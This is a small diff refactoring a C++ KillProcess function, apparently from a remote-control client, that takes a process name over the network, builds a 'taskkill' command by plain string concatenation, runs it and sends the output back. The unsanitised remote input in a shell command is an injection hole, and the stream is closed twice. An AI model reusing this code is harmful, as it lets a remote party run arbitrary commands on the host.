@@ -1,7 +1,6 @@
 void KillProcess()
 {
-    std::string process = recv(1);
-    std::string killCommand = "taskkill /im " + process + " /f";
+    std::string process = recv(1), killCommand = "taskkill /im " + process + " /f", data;
     FILE* stream;
 
     killCommand.append(" 2>&1");
@@ -13,9 +12,7 @@ void KillProcess()
             data.append(buffer);
         
         } pclose(stream);
-    
-    } sendAll(data);
-    
-    data.clear();
+    }
+    sendAll(data);
     fclose(stream);
 }
